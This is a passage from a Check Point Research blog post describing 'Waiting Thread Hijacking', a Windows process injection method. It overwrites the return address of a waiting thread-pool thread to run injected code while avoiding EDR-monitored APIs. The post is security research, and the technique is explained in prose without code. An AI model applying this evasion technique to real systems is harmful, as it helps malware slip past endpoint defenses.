# https://research.checkpoint.com/2025/waiting-thread-hijacking/

<!DOCTYPE html><html lang="en-US">
<body class="wp-singular post-template-default single single-post postid-31349 single-format-standard wp-theme-research-th">
 

 

<div class="container container-wide">
	<div class="mobile-categories-nav">
		<div class="sidebar-post-categories">
	<div class="text font-blue">
			<h2>CATEGORIES</h2>
		</div>
					<ul class="post-category">
			 
			<li> 
				<a href="https://research.checkpoint.com/category/android-malware/">
					<input type="checkbox" id="10457" class="cat-filter" value="10457">
					<label for="10457"> Android Malware</label>
					<span>23</span>
				</a>	
			</li>
			 
			<li> 
				<a href="https://research.checkpoint.com/category/artificial-intelligence-2/">
					<input type="checkbox" id="10621" class="cat-filter" value="10621">
					<label for="10621"> Artificial Intelligence</label>
					<span>4</span>
				</a>	
			</li>
			 
			<li> 
				<a href="https://research.checkpoint.com/category/chatgpt/">
					<input type="checkbox" id="10637" class="cat-filter" value="10637">
					<label for="10637"> ChatGPT</label>
					<span>3</span>
				</a>	
			</li>
			 
			<li> 
				<a href="https://research.checkpoint.com/category/threat-research/">
					<input type="checkbox" id="10441" class="cat-filter" value="10441">
					<label for="10441"> Check Point Research Publications</label>
					<span>442</span>
				</a>	
			</li>
			 
			<li> 
				<a href="https://research.checkpoint.com/category/cloud-security/">
					<input type="checkbox" id="10634" class="cat-filter" value="10634">
					<label for="10634"> Cloud Security</label>
					<span>1</span>
				</a>	
			</li>
			 
			<li> 
				<a href="https://research.checkpoint.com/category/cpradio/">
					<input type="checkbox" id="10539" class="cat-filter" value="10539">
					<label for="10539"> CPRadio</label>
					<span>44</span>
				</a>	
			</li>
			 
			<li> 
				<a href="https://research.checkpoint.com/category/crypto/">
					<input type="checkbox" id="10655" class="cat-filter" value="10655">
					<label for="10655"> Crypto</label>
					<span>2</span>
				</a>	
			</li>
			 
			<li> 
				<a href="https://research.checkpoint.com/category/data-threat-intelligence/">
					<input type="checkbox" id="10643" class="cat-filter" value="10643">
					<label for="10643"> Data &amp; Threat Intelligence</label>
					<span>1</span>
				</a>	
			</li>
			 
			<li> 
				<a href="https://research.checkpoint.com/category/data-analysis/">
					<input type="checkbox" id="10645" class="cat-filter" value="10645">
					<label for="10645"> Data Analysis</label>
					<span>0</span>
				</a>	
			</li>
			 
			<li> 
				<a href="https://research.checkpoint.com/category/demos/">
					<input type="checkbox" id="10062" class="cat-filter" value="10062">
					<label for="10062"> Demos</label>
					<span>22</span>
				</a>	
			</li>
			 
			<li> 
				<a href="https://research.checkpoint.com/category/threat-intelligence-reports/">
					<input type="checkbox" id="10060" class="cat-filter" value="10060">
					<label for="10060"> Global Cyber Attack Reports</label>
					<span>394</span>
				</a>	
			</li>
			 
			<li> 
				<a href="https://research.checkpoint.com/category/how-to-guides/">
					<input type="checkbox" id="10475" class="cat-filter" value="10475">
					<label for="10475"> How To Guides</label>
					<span>13</span>
				</a>	
			</li>
			 
			<li> 
				<a href="https://research.checkpoint.com/category/ransomware/">
					<input type="checkbox" id="10622" class="cat-filter" value="10622">
					<label for="10622"> Ransomware</label>
					<span>3</span>
				</a>	
			</li>
			 
			<li> 
				<a href="https://research.checkpoint.com/category/russo-ukrainian-war/">
					<input type="checkbox" id="10624" class="cat-filter" value="10624">
					<label for="10624"> Russo-Ukrainian War</label>
					<span>1</span>
				</a>	
			</li>
			 
			<li> 
				<a href="https://research.checkpoint.com/category/security-report/">
					<input type="checkbox" id="10656" class="cat-filter" value="10656">
					<label for="10656"> Security Report</label>
					<span>1</span>
				</a>	
			</li>
			 
			<li> 
				<a href="https://research.checkpoint.com/category/threat-and-data-analysis/">
					<input type="checkbox" id="10644" class="cat-filter" value="10644">
					<label for="10644"> Threat and data analysis</label>
					<span>0</span>
				</a>	
			</li>
			 
			<li> 
				<a href="https://research.checkpoint.com/category/threat-research-2/">
					<input type="checkbox" id="10458" class="cat-filter" value="10458">
					<label for="10458"> Threat Research</label>
					<span>173</span>
				</a>	
			</li>
			 
			<li> 
				<a href="https://research.checkpoint.com/category/web3/">
					<input type="checkbox" id="10653" class="cat-filter" value="10653">
					<label for="10653"> Web 3.0 Security</label>
					<span>11</span>
				</a>	
			</li>
			 
			<li> 
				<a href="https://research.checkpoint.com/category/wipers/">
					<input type="checkbox" id="10623" class="cat-filter" value="10623">
					<label for="10623"> Wipers</label>
					<span>0</span>
				</a>	
			</li>
					</ul>
		</div>

	</div>
</div>
<section id="single-post" class="blog-post-wrapper single-blog-wrapper section-padding background-blue ">
	<div class="container container-wide">
		
		<div class="flex-row align-items-start">
			<div class="flex-8 font-white">
				<div class="blog-post-wrap">
					<div class="flex-row">
						<div class="flex-12">
														<div class="image">
								<img src="https://research.checkpoint.com/wp-content/uploads/2025/04/cropped-Snapshot_2025-04-14_19-55-261.png" alt="">
							</div>
													</div>
						<div class="flex-9">
							<div class="text">
								<h1 class="h3">Waiting Thread Hijacking: A Stealthier Version of Thread Execution Hijacking</h1>
								<div class="date">
									<svg xmlns="http://www.w3.org/2000/svg" width="14.012" height="14.012" viewBox="0 0 14.012 14.012"><path id="Path_149" data-name="Path 149" d="M1.752,4.379v7.882H12.261V4.379Zm9.634-2.627h1.752a.827.827,0,0,1,.876.876V13.137a.827.827,0,0,1-.876.876H.876A.827.827,0,0,1,0,13.137V2.627a.827.827,0,0,1,.876-.876H2.627V.876A.827.827,0,0,1,3.5,0a.827.827,0,0,1,.876.876v.876H9.634V.876a.876.876,0,1,1,1.752,0Zm-.876,8.758H8.758V8.758h1.752Zm-2.627,0H6.13V8.758H7.882Zm2.627-2.627H8.758V6.13h1.752Zm-2.627,0H6.13V6.13H7.882ZM5.255,10.509H3.5V8.758H5.255Z" fill="#fff" fill-rule="evenodd"></path></svg>									
									April 14, 2025								</div>
							</div>
						</div>
						<div class="flex-3">
							<div class="social-button">
		<div class="icon-sharing-links">
			<a target="_blank" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https://research.checkpoint.com/2025/waiting-thread-hijacking/%20-%20%20https://research.checkpoint.com/?p=31349;source=LinkedIn" title="Share on LinkedIn!"><svg style="fill: currentColor;" id="Group_185773" data-name="Group 185773" xmlns="http://www.w3.org/2000/svg" width="15.863" height="15.697" viewBox="0 0 15.863 15.697"><path id="Path_28" data-name="Path 28" d="M41.342,107.835H38.107V97.622c2.039-.532,2.921-.341,3.249.629a10.413,10.413,0,0,1,2.275-1.038c2.6-.5,4.128.657,4.565,3.306a7.793,7.793,0,0,1,.128,1.212c.014,1.986.006,3.973.006,6.07H45.04c0-1.073,0-2.147,0-3.22,0-.724.016-1.449-.015-2.173-.075-1.7-.606-2.4-1.771-2.4-1.211.006-1.861.8-1.9,2.469C41.31,104.241,41.342,106,41.342,107.835Z" transform="translate(-32.47 -92.138)" fill="currentColor"></path><path id="Path_29" data-name="Path 29" d="M31.482,97.555h3.156v10.359H31.482Z" transform="translate(-31.164 -92.228)" fill="currentColor"></path> <path id="Path_30" data-name="Path 30" d="M32.993,94.694a1.862,1.862,0,0,1-1.907-1.862,1.891,1.891,0,0,1,1.88-1.912,1.867,1.867,0,0,1,1.889,1.885A1.816,1.816,0,0,1,32.993,94.694Z" transform="translate(-31.086 -90.92)" fill="currentColor"></path></svg></a>
			
			<a target="blank" href="http://www.facebook.com/sharer.php?u=https://research.checkpoint.com/2025/waiting-thread-hijacking/%20-%20https://research.checkpoint.com/?p=31349" title="Share on Facebook!"><svg style="fill: currentColor;" id="WKND-icon" xmlns="http://www.w3.org/2000/svg" width="14.347" height="14.347" viewBox="0 0 14.347 14.347"><rect id="background" width="14.347" height="14.347" transform="translate(0 0)" fill="transparent"></rect><g id="Dribbble-Light-Preview" transform="translate(3.966 0.077)"><g id="icons"><path id="facebook-_176_" data-name="facebook-[#176]" d="M333.867,7253.27v-6.422h1.95l.318-2.854h-2.268V7242.6c0-.735.019-1.465,1.046-1.465h1.04V7239.1a11.584,11.584,0,0,0-1.8-.1c-1.888,0-3.07,1.183-3.07,3.354v1.641H329v2.854h2.086v6.422Z" transform="translate(-329 -7239)" fill="currentColor" fill-rule="evenodd"></path> </g></g></svg></a>
			
			<a target="blank" href="http://twitter.com/home/?status=Waiting%20Thread%20Hijacking:%20A%20Stealthier%20Version%20of%20Thread%20Execution%20Hijacking%20-%20https://research.checkpoint.com/?p=31349%20via%20@kenmata" title="Tweet this!"><svg style="fill: currentColor;" id="WKND-icon" xmlns="http://www.w3.org/2000/svg" width="14.515" height="14.347" viewBox="0 0 14.515 14.347"><rect id="background" width="14.347" height="14.347" transform="translate(0 0)" fill="transparent"></rect><g id="Dribbble-Light-Preview" transform="translate(0.245 1.504)"><g id="icons"><path id="twitter-_154_" data-name="twitter-[#154]" d="M8.488,7372.416a8.206,8.206,0,0,0,8.33-8.2c0-.125,0-.25-.009-.373a5.9,5.9,0,0,0,1.461-1.492,5.926,5.926,0,0,1-1.681.453,2.9,2.9,0,0,0,1.287-1.595,5.9,5.9,0,0,1-1.859.7,2.964,2.964,0,0,0-4.143-.125,2.858,2.858,0,0,0-.847,2.754,8.364,8.364,0,0,1-6.034-3.011,2.857,2.857,0,0,0,.907,3.847,2.942,2.942,0,0,1-1.329-.36v.036a2.9,2.9,0,0,0,2.349,2.825,2.954,2.954,0,0,1-1.321.049,2.924,2.924,0,0,0,2.735,2,5.929,5.929,0,0,1-3.636,1.236,5.847,5.847,0,0,1-.7-.041,8.379,8.379,0,0,0,4.488,1.292" transform="translate(-4 -7361)" fill="currentColor" fill-rule="evenodd"></path></g></g></svg></a>
		
			<a title="Copy this!"><svg style="fill: currentColor;" xmlns="http://www.w3.org/2000/svg" width="18.7" height="18.7" viewBox="0 0 18.7 18.7"><g id="Group_185774" data-name="Group 185774" transform="translate(-591.15 -798.097)"><g id="copy" transform="translate(592 798.947)"><rect id="Rectangle_147602" data-name="Rectangle 147602" width="11" height="11" rx="2" transform="translate(6 6)" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.7"></rect><path id="Path_83125" data-name="Path 83125" d="M4.542,13.016H3.695A1.7,1.7,0,0,1,2,11.321V3.695A1.7,1.7,0,0,1,3.695,2h7.626a1.7,1.7,0,0,1,1.695,1.695v.847" transform="translate(-2 -2)" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.7"></path></g></g></svg></a>
			<div id="31349" style="display: none;">https://research.checkpoint.com/2025/waiting-thread-hijacking/</div>
		
		</div>
		<div class="icon-sharing"></div>	
</div>						</div>
					</div>
										
					<div class="text border-bottom">
						
<p class="wp-block-paragraph"><strong>Research by:</strong> hasherezade</p>



<h1 class="wp-block-heading" id="key-points">Key Points</h1>



<ul class="wp-block-list">
<li>Process Injection is one of the important techniques in the attackers’ toolkit. In the constant cat-and-mouse game, attackers try to invent its new implementations that bypass defenses, using creative methods and lesser-known APIs.</li>



<li>Combining common building blocks in an atypical way, Check Point Research was able to create a much stealthier version of a known method, Thread Execution Hijacking.</li>
</ul>



<h1 class="wp-block-heading" id="introduction">Introduction</h1>



<p class="wp-block-paragraph">Process injection is one of the&nbsp;<a href="https://attack.mitre.org/techniques/T1055">important techniques used by attackers</a>. We can find its variants implemented in almost every malware. It serves purposes such as:</p>



<ul class="wp-block-list">
<li>defense evasion: hiding malicious modules under the cover of a different process</li>



<li>interference with existing processes: reading their memory, hooking used APIs, etc.</li>



<li>privilege escalation</li>
</ul>



<p class="wp-block-paragraph">In&nbsp;<a href="https://research.checkpoint.com/2024/thread-name-calling-using-thread-name-for-offense/">our previous blog</a>&nbsp;on&nbsp;<a href="https://attack.mitre.org/techniques/T1055/">process injections</a>&nbsp;we explained the foundations of this topic and basic ideas behind detection and prevention. We also proposed a new technique dubbed&nbsp;<a href="https://research.checkpoint.com/2024/thread-name-calling-using-thread-name-for-offense/">Thread Name-Calling</a>&nbsp;– abusing the Thread Name API that was originally intended to assign names to running threads. The technique allowed writing to a process using a handle without write access. Remote execution was achieved through&nbsp;<a href="https://repnz.github.io/posts/apc/user-apc/#ntqueueapcthreadex2-some-new-friends-in-the-fast-ring">the new API for Asynchronous Procedure Calls (APC)</a>, requesting a Special User APC. With the help of those building blocks, we were able to inject a payload and run it without being noticed by most tested EDRs (Endpoint Detection &amp; Response systems). While remote write was implemented using an unexpected API, execution wasn’t completely novel since it was a variant of&nbsp;<a href="https://attack.mitre.org/techniques/T1055/004">APC injection</a>.</p>



<p class="wp-block-paragraph">In the current research, we aim for the same goal: stealthy injection into a running process. This time we approach the problem from the opposite direction. We use common allocate and write primitives to achieve unexpected code execution. Furthermore, we show how to extend the implementation and obfuscate the called sequence of APIs in order to tamper behavioral signatures that could be used for detection. The described technique intercepts the flow of a waiting thread and misuses it for the execution of an implant – that’s why we dubbed it Waiting Thread Hijacking (WTH). It can be treated as an evolution of classic&nbsp;<a href="https://attack.mitre.org/techniques/T1055/003/">Thread Hijacking</a>. Unlike the older method, WTH avoids using APIs that trigger most alerts, such as&nbsp;<code>SuspendThread</code>&nbsp;/&nbsp;<code>ResumeThread</code>&nbsp;and&nbsp;<a href="https://medium.com/tenable-techblog/api-series-setthreadcontext-d08c9f84458d"><code>SetThreadContext</code></a>.</p>



<p class="wp-block-paragraph">It involves handles with the following access:</p>



<ul class="wp-block-list">
<li>For the target process:&nbsp;<code>PROCESS_VM_OPERATION</code>,&nbsp;<code>PROCESS_VM_READ</code>,&nbsp;<code>PROCESS_VM_WRITE</code></li>



<li>For the target thread:&nbsp;<code>THREAD_GET_CONTEXT</code></li>
</ul>



<p class="wp-block-paragraph">Used APIs:</p>



<ul class="wp-block-list">
<li><code>NtQuerySystemInformation</code>&nbsp;(with a parameter of&nbsp;<code>SystemProcessInformation</code>&nbsp;)</li>



<li><code>GetThreadContext</code></li>



<li><code>ReadProcessMemory</code></li>



<li><code>VirtualAllocEx</code></li>



<li><code>WriteProcessMemory</code></li>



<li><code>VirtualProtectEx</code></li>
</ul>



<p class="wp-block-paragraph">The considered target is a 64-bit process with&nbsp;<a href="https://jsecurity101.medium.com/better-know-a-data-source-process-integrity-levels-8338f3b74990">medium integrity</a>.</p>



<h1 class="wp-block-heading" id="executing-remote-code">Executing Remote Code</h1>



<p class="wp-block-paragraph">To prevent remote code execution, AVs and EDRs try to monitor APIs related to known techniques (examples of monitored functions can be found in Mr-Un1k0d3r’s repository: <a href="https://github.com/Mr-Un1k0d3r/EDRs" target="_blank" rel="noreferrer noopener">https://github.com/Mr-Un1k0d3r/EDRs</a>). The implementation of restrictions differs from product to product. While some products tolerate remote allocation and write, an attempt to run the implant will surely result in detection. Options for triggering execution are very limited, and all APIs meant for this purpose are closely watched. That’s why finding a new, unexpected way to do so is one of the biggest challenges attackers and red teamers face while trying to implement code injection.</p>



<p class="wp-block-paragraph">The basic constraint is that code runs on&nbsp;<a href="https://www.microsoftpressstore.com/articles/article.aspx?p=2233328&amp;seqNum=4">threads</a>. This leaves us with two possibilities: either to create a new thread in the target process, or to use some of the existing ones. An alternative way to run code are&nbsp;<a href="https://www.ired.team/offensive-security/code-injection-process-injection/executing-shellcode-with-createfiber">fibers</a>&nbsp;(example:&nbsp;<em>ImmoralFiber,&nbsp;<a href="https://github.com/JanielDary/ImmoralFiber">BlackHat Asia 2024</a></em>), although at a low level they are still&nbsp;<a href="https://learn.microsoft.com/en-us/windows/win32/procthread/fibers">managed by threads</a>. While using fibers can help in hiding execution within a local process, it is not much helpful in achieving remote execution. In order to use them to run code within a remote process, the target must already have existing fibers. This drastically narrows down the list of possible targets, making this method unusable in most real-life scenarios.</p>



<p class="wp-block-paragraph">The common approaches to remotely execute injected code:</p>



<ul class="wp-block-list">
<li>Remote thread creation</li>



<li>Adding a function to the APC queue of an existing thread</li>



<li>Direct manipulation of an existing thread’s context (<code>GetThreadContext</code>/&nbsp;<code>SetThreadContext</code>). This includes using&nbsp;<a href="https://www.alex-ionescu.com/rtlremotecall/"><code>RtlRemoteCall</code></a>&nbsp;API (since it calls&nbsp;<code>GetThreadContext</code>/&nbsp;<code>SetThreadContext</code>&nbsp;underneath).</li>



<li>Installing hooks</li>



<li>Replacing the defined callbacks</li>
</ul>



<p class="wp-block-paragraph">Let’s analyze each option one by one.</p>



<p class="wp-block-paragraph">Creating a remote thread is straightforward, and involves using one of the APIs from the&nbsp;<a href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadscreateremotethread">CreateRemoteThread</a>&nbsp;series. Although we may&nbsp;<a href="https://aliongreen.github.io/posts/remote-thread-injection.html">apply it in various ways</a>, calling high- or low-level versions of those functions or even using raw syscalls, the end result won’t be very stealthy. Creation of a new thread generates a kernel callback that makes an EDR quickly notified about the suspicious intentions (via&nbsp;<a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/nf-ntddk-pssetcreatethreadnotifyroutine"><code>PsSetCreateThreadNotifyRoutine</code></a>/&nbsp;<a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/nf-ntddk-pssetcreatethreadnotifyroutineex"><code>Ex</code></a><strong>)</strong>,</p>



<p class="wp-block-paragraph">This leads to the conclusion that what pays off more is giving up on creating new threads altogether, and somehow hopping onto an existing one. The most straightforward and convenient way is using APC, as it was explained in details in the&nbsp;<a href="https://research.checkpoint.com/2024/thread-name-calling-using-thread-name-for-offense/">blog about Thread Name-Calling</a>. This method however also has its drawbacks. In this scenario a kernel callback won’t be triggered, but yet, it generates an&nbsp;<a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/devtest/event-tracing-for-windows--etw-">ETW event</a>, for which an AV/EDR product can listen. Second, a handle to the thread must be opened with&nbsp;<code>THREAD_SET_CONTEXT</code>&nbsp;access. The event of opening a handle also generates a kernel callback (that can be monitored in kernel mode via&nbsp;<a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-obregistercallbacks">ObRegisterCallbacks</a>), so we should tend to avoid suspicious flags, and minimize the requested access.</p>



<p class="wp-block-paragraph">Direct manipulation of an existing thread is a part of another old and well-known method, called&nbsp;<a href="https://attack.mitre.org/techniques/T1055/003/">thread execution hijacking</a>. It involves finding a thread within the target process, suspending it, changing its context to redirect the execution flow into our own code, and then resuming it. Just like APC injection, it requires the thread handle to be open with&nbsp;<code>THREAD_SET_CONTEXT</code>, plus another suspicious flag:&nbsp;<code>THREAD_SUSPEND_RESUME</code>. Another problem is that the APIs related to this method are usually monitored, which will get us stopped by an EDR. If we give up on all functions that require modifications of the thread context, we are left with simple writes to the target process’ memory. This seems like not much, but using it creatively can still achieve code execution.</p>



<p class="wp-block-paragraph">One of the basic ideas from this category is API hooking. We can predict that there are some functions within the process that will be called at some point. If we intercept them, we can get our code to run alongside. There are multiple different options to implement hooks: inline as well as in IAT (Import Address Table) or EAT (Export Address Table). However, installing them requires overwriting a part of the loaded DLL, which often raises alerts.</p>



<p class="wp-block-paragraph">The more creative approach is based on the fact that a process may use various callbacks executed on particular events. If we overwrite a pointer to the callback function, we can force our code to be executed instead. There are a variety of publications detailing different methods from this group. A few examples include:</p>



<ul class="wp-block-list">
<li><a href="https://attack.mitre.org/techniques/T1055/005/">Overwriting TLS callbacks</a></li>



<li><a href="https://attack.mitre.org/techniques/T1574/013/">Overwriting Kernel Callback Table</a></li>



<li>Overwriting GUI callbacks (examples:&nbsp;<a href="https://web.archive.org/web/20240316160018/https://modexp.wordpress.com/2019/04/25/seven-window-injection-methods/">odzhan blog</a>&nbsp;#1)</li>



<li>Overwriting ETW callbacks (example:&nbsp;<a href="https://web.archive.org/web/20240324163515/https://modexp.wordpress.com/2020/04/08/red-teams-etw/">odzhan blog</a>&nbsp;#2)</li>



<li>PROPagate – running code using Windows subclassing (<a href="https://www.hexacorn.com/blog/2017/10/26/propagate-a-new-code-injection-trick/">hexacorn blog</a>&nbsp;#1,&nbsp;<a href="https://www.hexacorn.com/blog/2017/11/03/propagate-a-new-code-injection-trick-64-bit-and-32-bit/">hexacorn blog</a>&nbsp;#2)</li>
</ul>



<p class="wp-block-paragraph">An interesting and novel addition to this group was a technique described by Alon Leviev in his publication on&nbsp;<a href="https://www.safebreach.com/blog/process-injection-using-windows-thread-pools/">Thread “Pool-Party”</a>. His idea is based on the fact that Windows makes heavy use of&nbsp;<a href="https://www.microsoftpressstore.com/articles/article.aspx?p=2233328&amp;seqNum=6">thread pools</a>. By getting a handle to the Worker Factory of the target, we can manipulate its structure to link to our implant and enforce its execution. For example, we can overwrite the start address within the Worker Factory’s structure redirecting it to our shellcode, and then trigger its run. It is also possible to install a new work item into the remote process by manually writing its structure and attaching it to the Worker Factory’s queue.</p>



<p class="wp-block-paragraph">In the solution that we are going to introduce, some of the observations mentioned in the Alon’s paper will be used as well. However, the whole technique is much simpler and based on manipulating one of the threads that are products of the factory rather than the factory itself.</p>



<h1 class="wp-block-heading" id="what-the-hell-is-waiting-thread-hijacking">What Problems Waiting Thread Hijacking Solves?</h1>



<p class="wp-block-paragraph">Waiting Thread Hijacking is a method inspired by the concepts of the&nbsp;<a href="https://attack.mitre.org/techniques/T1055/003/">classic Thread Execution Hijacking</a>, and the research about the&nbsp;<a href="https://www.microsoftpressstore.com/articles/article.aspx?p=2233328&amp;seqNum=6">Thread Pool</a>. However, its usage is not strictly limited to the threads belonging to the thread pool.</p>



<p class="wp-block-paragraph">Let’s think about what the biggest problems with the classic Thread Execution Hijacking are.</p>



<ul class="wp-block-list">
<li>First of all, we have to suspend a remote thread, and resume it afterwards. This may create some synchronization issues in the target application. But most importantly, it forces us to use&nbsp;<code>SuspendThread</code>/&nbsp;<code>ResumeThread</code>&nbsp;API, and the thread handle with the access&nbsp;<code>THREAD_SUSPEND_RESUME</code>. Those are suspicious indicators that will surely be observed by an EDR.
<ul class="wp-block-list">
<li><em>If only we could find a process where this is done automatically on the target side, we would avoid this hurdle…</em></li>
</ul>
</li>



<li>Second, we need to redirect execution of the suspended thread to the implant. In the classic version of this technique,&nbsp;<code>SetThreadContext</code>&nbsp;(or its low-level equivalent,&nbsp;<a href="https://ntdoc.m417z.com/ntsetcontextthread"><code>NtSetContextThread</code></a>) is used. The redirection is done by modifying the Instruction Pointer. The direct setting of the thread context is very suspicious, and&nbsp;<a href="https://medium.com/tenable-techblog/api-series-setthreadcontext-d08c9f84458d">noisy (generates two different ETW events)</a>. It will most likely get us flagged by the AV/EDR. Also, it requires&nbsp;<code>THREAD_SET_CONTEXT</code>&nbsp;access on the handle, which we would like to avoid.
<ul class="wp-block-list">
<li><em>Is it possible to change the thread’s execution flow without manually modifying its context?</em></li>
</ul>
</li>



<li>Finally, returning to the original execution flow won’t be seamless. We need to store the original thread context somewhere, and restore it at our shellcode’s exit. The stability of the target process may be at risk.
<ul class="wp-block-list">
<li><em>Is it possible to just return to the original execution without the need to set the thread context again?</em></li>
</ul>
</li>
</ul>



<p class="wp-block-paragraph">It turns out, those limitations can be overcome with a few simple tricks.</p>



<p class="wp-block-paragraph">An old-school step used in the exploitation of buffer overflows is replacing the return address of the function with our own address. A working exploit may involve other primitives, like allocation of executable memory, or adding the execution permission. In order to circumvent this, restrictions like&nbsp;<a href="https://www.ired.team/offensive-security/defense-evasion/acg-arbitrary-code-guard-processdynamiccodepolicy">DCP (Dynamic Code Prohibited)</a> have been invented. Those are also the typical events that Anti-exploit software will monitor. However, DCP policies do not apply if the executable memory is allocated within the target via an external process. It turns out, that the event of replacing the return address may also go unnoticed if it is done externally. In the current technique, we take advantage of it.</p>



<p class="wp-block-paragraph">Still, we need to be very selective under which circumstances the return address can be overwritten. Since we have to avoid manual suspending/resuming of threads, we will use the threads that let us achieve the same effect by their own features. That is, waiting threads, which return addresses we can manipulate without destabilizing the whole application. Such threads can easily be found thanks to Thread Pools.</p>



<h2 class="wp-block-heading" id="thread-pools-basics">Thread Pools Basics</h2>



<p class="wp-block-paragraph">The&nbsp;<a href="https://learn.microsoft.com/en-us/windows/win32/procthread/thread-pools">concept of Thread Pools</a>&nbsp;has been around since early editions of Windows, and its modern form was introduced in Vista. The details of the API, and its evolution are&nbsp;<a href="https://learn.microsoft.com/en-us/windows/win32/procthread/thread-pools">described on MSDN</a>.</p>



<p class="wp-block-paragraph">Thread Pools are the way of optimizing the thread creation and task processing. Rather than creating a new thread each time when there is some new event to handle, we have a set of ready-made threads that are reused. Part of the Thread Pool architecture is the presence of work queue and waiter threads.</p>



<p class="wp-block-paragraph">By inspecting processes using tools like Process Explorer or&nbsp;<a href="https://systeminformer.com/">System Informer</a>, you can observe the thread pool mechanism at work. Most of the default Windows processes consist of multiple threads, many of which are in a waiting state. The callstacks of those threads contain functions prefixed with&nbsp;<code>Tp*</code>&nbsp;– that stand for Thread Pool.</p>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="https://research.checkpoint.com/wp-content/uploads/2025/04/1BJM555JLK-rId58.png" alt="Figure 2 - View from ProcessExplorer. Example of the callstack of a
thread belonging to a pool, and waiting in the WrQueue."><figcaption class="wp-element-caption">Figure 1 – View from ProcessExplorer. Example of the callstack of a thread belonging to a pool, and waiting in the WrQueue.</figcaption></figure>
</div>


<h2 class="wp-block-heading" id="taking-advantage-of-thread-pools">Taking Advantage of Thread Pools</h2>



<p class="wp-block-paragraph">On any modern Windows system we find&nbsp;<a href="https://scorpiosoftware.net/2022/03/21/threads-threads-and-more-threads/">plenty of processes with waiting threads</a>, that are managed by a Thread Pool. They can provide the building blocks to create a stealthier version of Thread Execution Hijacking.</p>



<p class="wp-block-paragraph">Rather than suspending and then resuming one of the existing threads, we can take advantage of one of the waiting threads that are dormant. These threads will automatically reactivate on the awaited event, giving us exactly the effect that we wanted to achieve, without the need of calling external APIs.</p>



<p class="wp-block-paragraph">Another problem to solve was related to changing the thread context. This time we won’t manipulate the instruction pointer directly. In the considered case, we are dealing with the thread that waits on a syscall for its completion. The last executed function was simply a corresponding syscall wrapper within NTDLL. Knowing that those wrappers use a very simple layout, we are sure that the last element on the stack is a return address. So, we can simply get the context of the thread, read the stack pointer, and then replace the return address with the pointer to our own code.</p>



<p class="wp-block-paragraph">All that is needed to perform those operations is a thread handle with&nbsp;<a href="https://learn.microsoft.com/en-us/windows/win32/procthread/thread-security-and-access-rights"><code>THREAD_GET_CONTEXT</code></a>, and a process handle with the read/write permissions (&nbsp;<code><a href="https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights" target="_blank" rel="noreferrer noopener">PROCESS_VM_READ | PROCESS_VM_WRITE</a></code>&nbsp;).</p>



<p class="wp-block-paragraph">While interference in threads involving suspending/resuming and manual context setting will be blocked by most EDRs, this approach allows to avoid the common triggers and achieve the code execution.</p>



<h2 class="wp-block-heading" id="identifying-suitable-threads">Identifying Suitable Threads</h2>



<p class="wp-block-paragraph">In theory, any waiting thread, regardless of the wait reason, can be subject to hijacking. But of course we don’t want to introduce synchronization issues in the attacked application. One of the safe options is to pick threads with the wait reason&nbsp;<code>WrQueue</code>. This reason indicates that the thread is waiting on a&nbsp;<code>KQUEUE</code>&nbsp;object, which is a kernel object used to manage queues of IRPs.</p>



<p class="wp-block-paragraph">To find them, we use the native function&nbsp;<code>NtQuerySystemInformation</code>&nbsp;with a parameter&nbsp;<code>SystemProcessInformation</code>, allowing us to enumerate all processes and threads and extract useful information. For each thread, it retrieves the structure&nbsp;<a href="https://www.geoffchappell.com/studies/windows/km/ntoskrnl/api/ex/sysinfo/thread.htm"><code>SYSTEM_THREAD_INFORMATION</code></a>. The field&nbsp;<code>ThreadState</code>&nbsp;allows checking if the thread is currently waiting, and the&nbsp;<code>WaitReason</code>&nbsp;gives more information on what caused it.</p>



<p class="wp-block-paragraph">The presence of the&nbsp;<code>WrQueue</code>&nbsp;wait reason indicates that we are dealing with one of two possible scenarios.</p>



<ol class="wp-block-list">
<li>The wait happens inside the&nbsp;<code>NtRemoveIoCompletion</code>&nbsp;that was called by kernelbase →&nbsp;<code>GetQueuedCompletionStatus</code>:</li>
</ol>


<div class="wp-block-image">
<figure class="aligncenter size-full"><img fetchpriority="high" decoding="async" width="866" height="270" src="https://research.checkpoint.com/wp-content/uploads/2025/04/1BJM555JLK-rId66.png" alt="" class="wp-image-31353"><figcaption class="wp-element-caption">Figure 2 – Inside the function&nbsp;<code>GetQueuedCompletionStatus</code>&nbsp;. The highlighted line shows the return address of the syscall wrapper.</figcaption></figure>
</div>


<ol class="wp-block-list">
<li>The wait happens inside&nbsp;<code>NtWaitForWorkViaWorkerFactory</code>&nbsp;that was called by ntdll →&nbsp;<code>TppWorkerThread</code></li>
</ol>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="https://research.checkpoint.com/wp-content/uploads/2025/04/1BJM555JLK-rId69.png" alt="Figure 4 - Inside the function <code>TppWorkerThread</code> . The
highlighted line shows the return address of the syscall wrapper."><figcaption class="wp-element-caption">Figure 3 – Inside the function&nbsp;<code>TppWorkerThread</code>&nbsp;. The highlighted line shows the return address of the syscall wrapper.</figcaption></figure>
</div>


<p class="wp-block-paragraph"><em>The original return address is highlighted in gray on each picture.</em></p>



<p class="wp-block-paragraph">In both cases, the situation is favorable for hijacking. The thread waits on syscall completion within a syscall wrapper function. Those wrappers do not create stack frames. The first argument at the top of the stack is the return address, leading back to the caller’s function.</p>



<h2 class="wp-block-heading" id="ensuring-a-happy-ending">Ensuring a Happy Ending</h2>



<p class="wp-block-paragraph">One of the important things to remember while implementing an injection method, is ensuring that after executing our code the target application won’t crash.</p>



